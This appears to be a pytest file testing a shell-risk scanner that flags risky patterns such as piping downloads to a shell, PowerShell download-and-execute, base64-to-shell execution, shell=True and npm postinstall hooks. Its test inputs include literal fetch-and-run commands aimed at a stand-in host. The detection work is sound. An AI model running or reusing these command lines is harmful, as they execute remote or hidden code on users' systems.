from pathlib import Path

from check_shell_risk import scan_package_json, scan_text


def rule_ids(text: str) -> set[str]:
    return {finding.rule_id for finding in scan_text(Path("script.sh"), "script.sh", text)}


def test_detects_curl_and_wget_pipe_to_shell():
    assert "shell-curl-pipe" in rule_ids("curl https://payload.test/install.sh | sh")
    assert "shell-wget-pipe" in rule_ids("wget https://payload.test/install.sh | bash")


def test_detects_powershell_download_execute():
    assert "shell-powershell-download-exec" in rule_ids("iex (iwr https://payload.test/install.ps1)")


def test_detects_base64_execution():
    assert "shell-base64-exec" in rule_ids("echo SGVsbG8= | base64 --decode | sh")


def test_detects_python_shell_true():
    assert "python-subprocess-shell-true" in rule_ids("subprocess.run('echo risky', shell=True)")


def test_detects_runtime_package_install():
    assert "runtime-package-install" in rule_ids("python -m pip install example-package")


def test_detects_postinstall_hook():
    text = '{"scripts": {"postinstall": "node scripts/setup.js"}}'
    findings = scan_package_json(Path("package.json"), "package.json", text)
    assert "npm-postinstall-hook" in {finding.rule_id for finding in findings}


def test_suppresses_documentation_safe_domains():
    findings = scan_text(Path("README.md"), "README.md", "See https://example.com/install.sh")
    assert "network-call-unknown-domain" not in {finding.rule_id for finding in findings}
